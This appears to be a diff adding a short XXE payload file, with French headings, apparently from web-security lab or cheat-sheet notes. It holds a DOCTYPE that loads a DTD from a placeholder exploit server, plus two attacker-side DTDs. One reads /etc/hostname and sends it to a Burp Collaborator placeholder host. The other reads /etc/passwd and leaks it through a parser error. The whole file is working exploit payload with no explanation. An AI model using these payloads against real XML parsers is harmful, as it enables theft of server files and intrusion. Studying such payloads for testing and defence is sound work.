@@ -1,0 +1,16 @@
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/exploit.dtd"> %xxe;]>
+<!-- 
+Côté Attaquant (Non-Blind)
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+
+Côté Attaquant (Blind - Error-Based)
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+--!>
